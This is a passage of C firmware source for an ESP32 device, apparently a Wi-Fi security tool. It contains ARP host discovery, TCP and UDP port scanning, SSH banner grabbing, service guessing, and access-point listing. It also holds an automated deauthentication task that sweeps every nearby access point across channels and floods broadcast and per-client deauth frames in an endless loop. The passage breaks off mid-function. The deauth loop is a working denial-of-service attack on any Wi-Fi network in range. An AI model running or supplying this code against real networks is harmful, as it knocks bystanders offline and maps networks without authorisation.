            char host_entry[80];
            snprintf(host_entry, sizeof(host_entry), "%2zu. %s [%02X:%02X:%02X:%02X:%02X:%02X]\n",
                    i + 1,
                    ctx->hosts[i].ip,
                    ctx->hosts[i].mac[0], ctx->hosts[i].mac[1], ctx->hosts[i].mac[2],
                    ctx->hosts[i].mac[3], ctx->hosts[i].mac[4], ctx->hosts[i].mac[5]);
            TERMINAL_VIEW_ADD_TEXT(host_entry);
            printf("%2zu. %s [%02X:%02X:%02X:%02X:%02X:%02X]\n",
                    i + 1,
                    ctx->hosts[i].ip,
                    ctx->hosts[i].mac[0], ctx->hosts[i].mac[1], ctx->hosts[i].mac[2],
                    ctx->hosts[i].mac[3], ctx->hosts[i].mac[4], ctx->hosts[i].mac[5]);
        }
    } else {
        TERMINAL_VIEW_ADD_TEXT("No active hosts found.\n");
        printf("No active hosts found.\n");
    }
    
    TERMINAL_VIEW_ADD_TEXT("\nARP scan completed.\n");
    printf("\nARP scan completed.\n");
    ESP_LOGI(TAG, "ARP scan completed. Found %zu active hosts", ctx->num_active_hosts);

    arp_scanner_cleanup(ctx);
    return true;
}

void scan_ports_on_host(const char *target_ip, host_result_t *result) {
    struct sockaddr_in server_addr;
    int sock;
    int scan_result;
    struct timeval timeout;
    fd_set fdset;
    int flags;

    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);

    printf("Scanning host: %s\n", target_ip);
    TERMINAL_VIEW_ADD_TEXT("Scanning host: %s\n", target_ip);

    for (size_t i = 0; i < NUM_PORTS; i++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS)
            break;

        uint16_t port = COMMON_PORTS[i];
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0)
            continue;

        flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        server_addr.sin_port = htons(port);
        scan_result = connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

        if (scan_result < 0 && errno == EINPROGRESS) {
            timeout.tv_sec = SCAN_TIMEOUT_MS / 1000;
            timeout.tv_usec = (SCAN_TIMEOUT_MS % 1000) * 1000;

            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);

            scan_result = select(sock + 1, NULL, &fdset, NULL, &timeout);

            if (scan_result > 0) {
                int error = 0;
                socklen_t len = sizeof(error);
                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
                    result->open_ports[result->num_open_ports++] = port;
                    printf("%s - Port %d is OPEN\n", target_ip, port);
                    TERMINAL_VIEW_ADD_TEXT("%s - Port %d is OPEN\n", target_ip, port);
                }
            }
        }

        close(sock);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}
static size_t build_udp_probe(uint16_t port, uint8_t *buf, size_t bufsize) {
    if (port == 53 && bufsize >= 64) {
        uint8_t *p = buf;
        uint16_t id = (uint16_t)esp_random();
        *(uint16_t *)(p + 0) = htons(id);
        *(uint16_t *)(p + 2) = htons(0x0100);
        *(uint16_t *)(p + 4) = htons(1);
        *(uint16_t *)(p + 6) = 0;
        *(uint16_t *)(p + 8) = 0;
        *(uint16_t *)(p + 10) = 0;
        p += 12;
        const char *name = "example.com";
        const char *dot = name;
        while (*dot) {
            const char *start = dot;
            while (*dot && *dot != '.') dot++;
            size_t len = (size_t)(dot - start);
            *p++ = (uint8_t)len;
            memcpy(p, start, len);
            p += len;
            if (*dot == '.') dot++;
        }
        *p++ = 0;
        *(uint16_t *)p = htons(1);
        p += 2;
        *(uint16_t *)p = htons(1);
        p += 2;
        return (size_t)(p - buf);
    }
    if (port == 123 && bufsize >= 48) {
        memset(buf, 0, 48);
        buf[0] = 0x1b;
        return 48;
    }
    if (port == 69 && bufsize >= 64) {
        uint8_t *p = buf;
        *(uint16_t *)p = htons(1);
        p += 2;
        const char *fname = "test";
        memcpy(p, fname, strlen(fname));
        p += strlen(fname);
        *p++ = 0;
        const char *mode = "octet";
        memcpy(p, mode, strlen(mode));
        p += strlen(mode);
        *p++ = 0;
        return (size_t)(p - buf);
    }
    if (port == 1900 && bufsize >= 256) {
        const char *msearch = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n";
        size_t len = strlen(msearch);
        memcpy(buf, msearch, len);
        return len;
    }
    if (bufsize >= 1) {
        buf[0] = 0x00;
        return 1;
    }
    return 0;
}

static bool udp_port_is_open(const char *target_ip, uint16_t port, uint32_t wait_ms) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return false;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &addr.sin_addr.s_addr);

    struct timeval tv;
    tv.tv_sec = wait_ms / 1000;
    tv.tv_usec = (wait_ms % 1000) * 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t probe[256];
    size_t probe_len = build_udp_probe(port, probe, sizeof(probe));
    if (probe_len == 0) {
        close(sock);
        return false;
    }
    sendto(sock, probe, probe_len, 0, (struct sockaddr *)&addr, sizeof(addr));

    uint8_t buf[512];
    struct sockaddr_in from;
    socklen_t fromlen = sizeof(from);
    int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen);
    if (n > 0) {
        close(sock);
        return true;
    }
    int err = errno;
    close(sock);
    if (err == ECONNREFUSED) return false;
    return false;
}

void scan_udp_ports_on_host(const char *target_ip, host_result_t *result) {
    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    printf("Scanning UDP host: %s\n", target_ip);
    TERMINAL_VIEW_ADD_TEXT("Scanning UDP host: %s\n", target_ip);

    for (size_t i = 0; i < NUM_UDP_PORTS; i++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS) break;
        uint16_t port = UDP_COMMON_PORTS[i];
        if (udp_port_is_open(target_ip, port, 40)) {
            result->open_ports[result->num_open_ports++] = port;
            printf("%s - UDP %d responded\n", target_ip, port);
            TERMINAL_VIEW_ADD_TEXT("%s - UDP %d responded\n", target_ip, port);
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }
}

bool scan_ip_udp_port_range(const char *target_ip, uint16_t start_port, uint16_t end_port) {
    scanner_ctx_t *ctx = scanner_init();
    if (!ctx) {
        printf("Failed to initialize scanner context\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
        return false;
    }

    ctx->num_active_hosts = 1;
    host_result_t *result = &ctx->results[0];
    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    printf("Scanning %s UDP ports %d-%d\n", target_ip, start_port, end_port);
    TERMINAL_VIEW_ADD_TEXT("Scanning %s UDP ports %d-%d\n", target_ip, start_port, end_port);

    uint16_t ports_scanned = 0;
    uint16_t total_ports = end_port - start_port + 1;

    for (uint16_t port = start_port; port <= end_port; port++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS) break;
        ports_scanned++;
        if (ports_scanned % 200 == 0) {
            printf("UDP Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned, total_ports,
                   (float)ports_scanned / total_ports * 100);
            TERMINAL_VIEW_ADD_TEXT("UDP Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned,
                                   total_ports, (float)ports_scanned / total_ports * 100);
        }
        if (udp_port_is_open(target_ip, port, 40)) {
            result->open_ports[result->num_open_ports++] = port;
            printf("%s - UDP %d responded\n", target_ip, port);
            TERMINAL_VIEW_ADD_TEXT("%s - UDP %d responded\n", target_ip, port);
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
        if (ctx->results[i].num_open_ports > 0) {
            printf("Host %s has %d udp ports responding\n", ctx->results[i].ip,
                   ctx->results[i].num_open_ports);
            TERMINAL_VIEW_ADD_TEXT("Host %s has %d udp ports responding\n", ctx->results[i].ip,
                                   ctx->results[i].num_open_ports);
        }
    }

    scanner_cleanup(ctx);
    return true;
}

void scan_ssh_on_host(const char *target_ip, host_result_t *result) {
    struct sockaddr_in server_addr;
    int sock;
    int scan_result;
    struct timeval timeout;
    fd_set fdset;
    int flags;
    char banner[256];
    ssize_t bytes_read;
    
    ESP_LOGI("SSH_SCAN", "Starting SSH scan on host: %s", target_ip);
    
    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;
    
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);
    
    printf("SSH scanning host: %s\n", target_ip);
    TERMINAL_VIEW_ADD_TEXT("SSH scanning host: %s\n", target_ip);
    
    uint16_t ssh_ports[] = {22, 2222, 2022};
    size_t num_ssh_ports = sizeof(ssh_ports) / sizeof(ssh_ports[0]);
    
    for (size_t i = 0; i < num_ssh_ports; i++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS)
            break;
            
        uint16_t port = ssh_ports[i];
        ESP_LOGI("SSH_SCAN", "Testing port %d on %s", port, target_ip);
        printf("Testing SSH port %d on %s...", port, target_ip);
        TERMINAL_VIEW_ADD_TEXT("Testing SSH port %d on %s...", port, target_ip);
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) {
            ESP_LOGE("SSH_SCAN", "Failed to create socket for port %d: errno=%d", port, errno);
            continue;
        }
            
        flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        server_addr.sin_port = htons(port);
        ESP_LOGD("SSH_SCAN", "Attempting connection to %s:%d", target_ip, port);
        scan_result = connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
        
        if (scan_result < 0 && errno == EINPROGRESS) {
            timeout.tv_sec = 3;
            timeout.tv_usec = 0;
            
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);
            
            scan_result = select(sock + 1, NULL, &fdset, NULL, &timeout);
            
            if (scan_result > 0) {
                int error = 0;
                socklen_t len = sizeof(error);
                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
                    ESP_LOGI("SSH_SCAN", "Port %d is OPEN on %s", port, target_ip);
                    result->open_ports[result->num_open_ports++] = port;
                    
                    fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);
                    
                    timeout.tv_sec = 2;
                    timeout.tv_usec = 0;
                    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
                    
                    memset(banner, 0, sizeof(banner));
                    bytes_read = recv(sock, banner, sizeof(banner) - 1, 0);
                    ESP_LOGD("SSH_SCAN", "Received %d bytes from %s:%d", (int)bytes_read, target_ip, port);
                    
                    if (bytes_read > 0) {
                        banner[bytes_read] = '\0';
                        char *newline = strchr(banner, '\r');
                        if (newline) *newline = '\0';
                        newline = strchr(banner, '\n');
                        if (newline) *newline = '\0';
                        
                        ESP_LOGI("SSH_SCAN", "SSH banner from %s:%d: %s", target_ip, port, banner);
                        printf(" OPEN: %s\n", banner);
                        TERMINAL_VIEW_ADD_TEXT(" OPEN: %s\n", banner);
                    } else {
                        printf(" OPEN (no banner)\n");
                        TERMINAL_VIEW_ADD_TEXT(" OPEN (no banner)\n");
                    }
                } else {
                    ESP_LOGD("SSH_SCAN", "Port %d connection failed on %s (getsockopt error)", port, target_ip);
                    printf(" CLOSED\n");
                    TERMINAL_VIEW_ADD_TEXT(" CLOSED\n");
                }
            } else {
                ESP_LOGD("SSH_SCAN", "Port %d timeout on %s (select result: %d)", port, target_ip, scan_result);
                printf(" TIMEOUT\n");
                TERMINAL_VIEW_ADD_TEXT(" TIMEOUT\n");
            }
        } else {
            ESP_LOGD("SSH_SCAN", "Port %d immediate connection failure on %s (errno: %d)", port, target_ip, errno);
            printf(" CLOSED\n");
            TERMINAL_VIEW_ADD_TEXT(" CLOSED\n");
        }
        
        close(sock);
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    printf("SSH scan completed on %s - found %d open ports\n", target_ip, result->num_open_ports);
    TERMINAL_VIEW_ADD_TEXT("SSH scan completed on %s - found %d open ports\n", target_ip, result->num_open_ports);
}

void scanner_cleanup(scanner_ctx_t *ctx) {
    if (ctx) {
        if (ctx->results) {
            free(ctx->results);
        }
        free(ctx);
    }
}
bool wifi_manager_scan_subnet() {
    scanner_ctx_t *ctx = scanner_init();
    if (!ctx) {
        printf("Failed to initialize scanner context\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
        return false;
    }

    if (!get_subnet_prefix(ctx)) {
        printf("Failed to get network information. Make sure WiFi is connected.\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get network information. Make sure WiFi is connected.\n");
        scanner_cleanup(ctx);
        return false;
    }

    char current_ip[26];
    ctx->num_active_hosts = 0;

    printf("Starting subnet scan on %s0/24\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT("Starting subnet scan on %s0/24\n", ctx->subnet_prefix);

    for (int host = START_HOST; host <= END_HOST; host++) {
        snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);

        if (is_host_active(current_ip)) {
            glog("Found active host: %s\n", current_ip);

            host_result_t tcp_result;
            host_result_t udp_result;

            scan_ports_on_host(current_ip, &tcp_result);
            scan_udp_ports_on_host(current_ip, &udp_result);

            ctx->results[ctx->num_active_hosts] = tcp_result;

            if (udp_result.num_open_ports > 0) {
                glog("UDP ports responding on %s:\n", current_ip);
                for (uint8_t k = 0; k < udp_result.num_open_ports; k++) {
                    char line[32];
                    snprintf(line, sizeof(line), "  UDP %d\n", udp_result.open_ports[k]);
                    glog("%s", line);
                }
            } else {
                glog("No UDP responses on %s\n", current_ip);
            }

            ctx->num_active_hosts++;
        }
    }
    glog("Scan completed. Found %d active hosts:\n", ctx->num_active_hosts);

    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
        if (ctx->results[i].num_open_ports > 0) {
            glog("Host %s has %d open ports:\n", ctx->results[i].ip,
                 ctx->results[i].num_open_ports);

            glog("Possible services/devices:\n");

            for (uint8_t j = 0; j < ctx->results[i].num_open_ports; j++) {
                uint16_t port = ctx->results[i].open_ports[j];
                glog("  - Port %d: ", port);

                switch (port) {
                case 20:
                case 21:
                    glog("FTP Server\n");
                    break;
                case 22:
                case 2222:
                    glog("SSH Server\n");
                    break;
                case 23:
                    glog("Telnet Server\n");
                    break;
                case 80:
                case 8080:
                case 8443:
                case 443:
                    glog("Web Server\n");
                    break;
                case 445:
                case 139:
                    glog("Windows File Share/Domain Controller\n");
                    break;
                case 3389:
                    glog("Windows Remote Desktop\n");
                    break;
                case 5900:
                case 5901:
                case 5902:
                    glog("VNC Remote Access\n");
                    break;
                case 1521:
                    glog("Oracle Database\n");
                    break;
                case 3306:
                    glog("MySQL Database\n");
                    break;
                case 5432:
                    glog("PostgreSQL Database\n");
                    break;
                case 27017:
                    glog("MongoDB Database\n");
                    break;
                case 9100:
                    glog("Network Printer\n");
                    break;
                case 32400:
                    glog("Plex Media Server\n");
                    break;
                case 2082:
                case 2083:
                case 2086:
                case 2087:
                    glog("Web Hosting Control Panel\n");
                    break;
                case 6379:
                    printf("Redis Server\n");
                    TERMINAL_VIEW_ADD_TEXT("Redis Server\n");
                    break;
                case 1883:
                case 8883:
                    printf("IoT Device (MQTT)\n");
                    TERMINAL_VIEW_ADD_TEXT("IoT Device (MQTT)\n");
                    break;
                default:
                    printf("Unknown Service\n");
                    TERMINAL_VIEW_ADD_TEXT("Unknown Service\n");
                }
            }

            bool has_web = false;
            bool has_db = false;
            bool has_file_sharing = false;

            for (uint8_t j = 0; j < ctx->results[i].num_open_ports; j++) {
                uint16_t port = ctx->results[i].open_ports[j];
                if (port == 80 || port == 443 || port == 8080 || port == 8443)
                    has_web = true;
                if (port == 3306 || port == 5432 || port == 1521 || port == 27017)
                    has_db = true;
                if (port == 445 || port == 139)
                    has_file_sharing = true;
            }

            printf("\nPossible device type:\n");
            TERMINAL_VIEW_ADD_TEXT("\nPossible device type:\n");

            if (has_web && has_db) {
                printf("- Web Application Server\n");
                TERMINAL_VIEW_ADD_TEXT("- Web Application Server\n");
            }
            if (has_file_sharing) {
                printf("- Windows Server\n");
                TERMINAL_VIEW_ADD_TEXT("- Windows Server\n");
            }
            printf("\n");
            TERMINAL_VIEW_ADD_TEXT("\n");
        }
    }

    scanner_cleanup(ctx);
    return true;
}

bool scan_ip_port_range(const char *target_ip, uint16_t start_port, uint16_t end_port) {
    scanner_ctx_t *ctx = scanner_init();
    if (!ctx) {
        printf("Failed to initialize scanner context\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
        return false;
    }

    ctx->num_active_hosts = 1;
    host_result_t *result = &ctx->results[0];
    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);

    printf("Scanning %s ports %d-%d\n", target_ip, start_port, end_port);
    TERMINAL_VIEW_ADD_TEXT("Scanning %s ports %d-%d\n", target_ip, start_port, end_port);

    uint16_t ports_scanned = 0;
    uint16_t total_ports = end_port - start_port + 1;

    for (uint16_t port = start_port; port <= end_port; port++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS)
            break;

        ports_scanned++;
        if (ports_scanned % 100 == 0) {
            printf("Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned, total_ports,
                   (float)ports_scanned / total_ports * 100);
            TERMINAL_VIEW_ADD_TEXT("Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned,
                                   total_ports, (float)ports_scanned / total_ports * 100);
        }

        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0)
            continue;

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        server_addr.sin_port = htons(port);
        int scan_result = connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

        if (scan_result < 0 && errno == EINPROGRESS) {
            struct timeval timeout = {.tv_sec = SCAN_TIMEOUT_MS / 1000,
                                      .tv_usec = (SCAN_TIMEOUT_MS % 1000) * 1000};
            fd_set fdset;
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);

            if (select(sock + 1, NULL, &fdset, NULL, &timeout) > 0) {
                int error = 0;
                socklen_t len = sizeof(error);
                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
                    result->open_ports[result->num_open_ports++] = port;
                    printf("%s - Port %d is OPEN\n", target_ip, port);
                    TERMINAL_VIEW_ADD_TEXT("%s - Port %d is OPEN\n", target_ip, port);
                }
            }
        }
        close(sock);
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
        if (ctx->results[i].num_open_ports > 0) {
            printf("Host %s has %d open ports:\n", ctx->results[i].ip,
                   ctx->results[i].num_open_ports);
            TERMINAL_VIEW_ADD_TEXT("Host %s has %d open ports:\n", ctx->results[i].ip,
                                   ctx->results[i].num_open_ports);
        }
    }

    scanner_cleanup(ctx);
    return true;
}

void wifi_manager_scan_for_open_ports() { wifi_manager_scan_subnet(); }

void rgb_visualizer_server_task(void *pvParameters) {
    char rx_buffer[MAX_PAYLOAD];
    char addr_str[128];
    int addr_family;
    int ip_protocol;

    while (1) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(UDP_PORT);
        addr_family = AF_INET;
        ip_protocol = IPPROTO_IP;
        inet_ntoa_r(dest_addr.sin_addr, addr_str, sizeof(addr_str) - 1);

        int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) {
            printf("Unable to create socket: errno %d\n", errno);
            break;
        }
        printf("Socket created\n");

        int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err < 0) {
            printf("Socket unable to bind: errno %d\n", errno);
        }
        printf("Socket bound, port %d\n", UDP_PORT);

        while (1) {
            printf("Waiting for data\n");
            struct sockaddr_in6 source_addr;
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                               (struct sockaddr *)&source_addr, &socklen);

            if (len < 0) {
                printf("recvfrom failed: errno %d\n", errno);
                break;
            } else {
                // Data received
                rx_buffer[len] = 0; // Null-terminate

                // Process the received data
                uint8_t *amplitudes = (uint8_t *)rx_buffer;
                size_t num_bars = len;
                update_led_visualizer(amplitudes, num_bars, false);
            }
        }

        if (sock != -1) {
            printf("Shutting down socket and restarting...\n");
            shutdown(sock, 0);
            close(sock);
        }
    }

    vTaskDelete(NULL);
}

void wifi_auto_deauth_task(void *Parameter) {
    while (1) {
        wifi_scan_config_t scan_config = {
            .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true};

        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
        vTaskDelay(pdMS_TO_TICKS(1500));
        esp_wifi_scan_stop();

        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));

        if (ap_count > 0) {
            scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
            if (scanned_aps == NULL) {
                printf("Failed to allocate memory for AP info\n");
                continue;
            }

            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
            printf("\nFound %d access points\n", ap_count);
            TERMINAL_VIEW_ADD_TEXT("\nFound %d access points\n", ap_count);
        } else {
            printf("\nNo access points found\n");
            TERMINAL_VIEW_ADD_TEXT("\nNo access points found\n");
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait before retrying if no APs found
            continue;
        }

        wifi_ap_record_t *ap_info = scanned_aps;
        if (ap_info == NULL) {
            printf("Failed to allocate memory for AP info\n");
            return;
        }

        for (int z = 0; z < 50; z++) {
            for (int i = 0; i < ap_count; i++) {
                for (int y = 1; y < 12; y++) {
                    int retry_count = 0;
                    esp_err_t err;
                    while (retry_count < 3) {
                        err = esp_wifi_set_channel(y, WIFI_SECOND_CHAN_NONE);
                        if (err == ESP_OK) {
                            break;
                        }
                        printf("Failed to set channel %d, retry %d\n", y, retry_count + 1);
                        vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between retries
                        retry_count++;
                    }

                    if (err != ESP_OK) {
                        printf("Failed to set channel after retries, skipping...\n");
                        continue; // Skip this channel if all retries failed
                    }

                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                            wifi_manager_broadcast_deauth(ap_info[i].bssid, y, station_ap_list[j].station_mac);
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(50));
                }
                vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between APs
            }
            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between cycles
        }

        free(scanned_aps);
        vTaskDelay(pdMS_TO_TICKS(1000)); // 1000ms delay before starting next scan
    }
}

void wifi_manager_auto_deauth() {
    printf("Starting auto deauth transmission...\n");
    wifi_auto_deauth_task(NULL);
}

void wifi_manager_stop_deauth() {
    if (beacon_task_running) {
        printf("Stopping deauth transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...\n");
        status_display_show_status("Deauth Stopping");
        if (deauth_task_handle != NULL) {
            vTaskDelete(deauth_task_handle);
            deauth_task_handle = NULL;
            beacon_task_running = false;
            rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
            wifi_manager_stop_monitor_mode();
            esp_wifi_stop();
            ap_manager_start_services();
            status_display_show_status("Deauth Stopped");
        }
    } else {
        status_display_show_status("No Deauth Active");
    }
}
static void wifi_manager_print_ap_entry_formatted(uint16_t idx, const wifi_ap_record_t *rec, bool include_security) {
    char sanitized_ssid[33];
    sanitize_ssid_and_check_hidden((uint8_t *)rec->ssid, sanitized_ssid, sizeof(sanitized_ssid));

    ECompany company = match_bssid_to_company(rec->bssid);
    const char *company_str = "Unknown";
    switch (company) {
        case COMPANY_DLINK: company_str = "DLink"; break;
        case COMPANY_NETGEAR: company_str = "Netgear"; break;
        case COMPANY_BELKIN: company_str = "Belkin"; break;
        case COMPANY_TPLINK: company_str = "TPLink"; break;
        case COMPANY_LINKSYS: company_str = "Linksys"; break;
        case COMPANY_ASUS: company_str = "ASUS"; break;
        case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
        default: company_str = "Unknown"; break;
    }

    printf("[%u] SSID: %s,\n"
           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
           "     RSSI: %d,\n"
           "     Channel: %d,\n",
           idx,
           sanitized_ssid,
           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
           rec->rssi,
           rec->primary);
    TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
                           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
                           "     RSSI: %d,\n"
                           "     Channel: %d,\n",
                           idx,
                           sanitized_ssid,
                           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
                           rec->rssi,
                           rec->primary);

#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
    if (include_security) {
        int ch = rec->primary;
        const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
        printf("     Band: %s,\n", band_str);
        TERMINAL_VIEW_ADD_TEXT("     Band: %s,\n", band_str);

        const char *auth_str = "Unknown";
        const char *pmf_str = NULL;
        switch (rec->authmode) {
            case WIFI_AUTH_OPEN: auth_str = "Open"; break;
            case WIFI_AUTH_WEP: auth_str = "WEP"; break;
            case WIFI_AUTH_WPA_PSK: auth_str = "WPA"; break;
            case WIFI_AUTH_WPA2_PSK: auth_str = "WPA2"; break;
            case WIFI_AUTH_WPA_WPA2_PSK: auth_str = "WPA/WPA2"; break;
            case WIFI_AUTH_WPA2_ENTERPRISE: auth_str = "WPA2-Enterprise"; break;
            case WIFI_AUTH_WPA3_PSK: auth_str = "WPA3"; pmf_str = "Required"; break;
            case WIFI_AUTH_WPA2_WPA3_PSK: auth_str = "WPA2/WPA3"; pmf_str = "Required (WPA3)"; break;
            case WIFI_AUTH_WAPI_PSK: auth_str = "WAPI"; break;
            case WIFI_AUTH_WPA3_ENTERPRISE: auth_str = "WPA3-Enterprise"; pmf_str = "Required"; break;
            default: auth_str = "Unknown"; break;
        }
        if (pmf_str) {
            printf("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
        } else {
            printf("     Security: %s\n", auth_str);
            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n", auth_str);
        }
    }
#endif

    if (strcmp(company_str, "Unknown") != 0) {
        printf("     Company: %s\n", company_str);
        TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
    }
}
void wifi_manager_print_scan_results_with_oui() {
    if (scanned_aps == NULL) {
        glog("AP information not available\n");
        return;
    }

    uint16_t limit = ap_count;
    if (limit > 50) {
        limit = 50;
    }

    for (uint16_t i = 0; i < limit; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

        ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
        const char *company_str = "Unknown";
        switch (company) {
        case COMPANY_DLINK:
            company_str = "DLink";
            break;
        case COMPANY_NETGEAR:
            company_str = "Netgear";
            break;
        case COMPANY_BELKIN:
            company_str = "Belkin";
            break;
        case COMPANY_TPLINK:
            company_str = "TPLink";
            break;
        case COMPANY_LINKSYS:
            company_str = "Linksys";
            break;
        case COMPANY_ASUS:
            company_str = "ASUS";
            break;
        case COMPANY_ACTIONTEC:
            company_str = "Actiontec";
            break;
        default:
            company_str = "Unknown";
            break;
        }

        glog("[%u] SSID: %s,\n"
             "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
             "     RSSI: %d,\n"
             "     Channel: %d,\n",
             i, sanitized_ssid, 
             scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
             scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
             scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
             scanned_aps[i].rssi,
             scanned_aps[i].primary);

#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
        {
            int ch = scanned_aps[i].primary;
            const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
            glog("     Band: %s,\n", band_str);
            
            const char *auth_str = "Unknown";
            const char *pmf_str = NULL;
            
            switch (scanned_aps[i].authmode) {
                case WIFI_AUTH_OPEN:
                    auth_str = "Open";
                    break;
                case WIFI_AUTH_WEP:
                    auth_str = "WEP";
                    break;
                case WIFI_AUTH_WPA_PSK:
                    auth_str = "WPA";
                    break;
                case WIFI_AUTH_WPA2_PSK:
                    auth_str = "WPA2";
                    break;
                case WIFI_AUTH_WPA_WPA2_PSK:
                    auth_str = "WPA/WPA2";
                    break;
                case WIFI_AUTH_WPA2_ENTERPRISE:
                    auth_str = "WPA2-Enterprise";
                    break;
                case WIFI_AUTH_WPA3_PSK:
                    auth_str = "WPA3";
